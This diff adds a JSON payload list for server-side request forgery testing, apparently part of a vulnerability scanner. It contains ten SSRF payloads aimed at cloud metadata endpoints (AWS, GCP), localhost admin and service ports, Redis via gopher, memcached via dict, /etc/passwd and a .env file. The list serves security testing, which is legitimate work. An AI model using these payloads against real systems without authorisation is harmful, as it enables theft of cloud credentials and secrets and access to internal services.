@@ -1,0 +1,16 @@
+{
+  "name": "Server-Side Request Forgery (SSRF)",
+  "description": "Payloads para probar vulnerabilidades SSRF que permiten al atacante hacer requests desde el servidor a recursos internos o externos.",
+  "payloads": [
+    {"id": "ssrf-01", "value": "http://169.254.169.254/latest/meta-data/", "method": "replace", "severity": "critical"},
+    {"id": "ssrf-02", "value": "http://127.0.0.1:8080/admin", "method": "replace", "severity": "critical"},
+    {"id": "ssrf-03", "value": "http://localhost:22", "method": "replace", "severity": "high"},
+    {"id": "ssrf-04", "value": "http://[::1]:80", "method": "replace", "severity": "high"},
+    {"id": "ssrf-05", "value": "http://0.0.0.0:6379", "method": "replace", "severity": "medium"},
+    {"id": "ssrf-06", "value": "file:///etc/passwd", "method": "replace", "severity": "critical"},
+    {"id": "ssrf-07", "value": "http://metadata.google.internal", "method": "replace", "severity": "high"},
+    {"id": "ssrf-08", "value": "dict://127.0.0.1:11211/", "method": "replace", "severity": "medium"},
+    {"id": "ssrf-09", "value": "gopher://127.0.0.1:6379/_INFO", "method": "replace", "severity": "high"},
+    {"id": "ssrf-10", "value": "http://localhost:3000/.env", "method": "replace", "severity": "medium"}
+  ]
+}
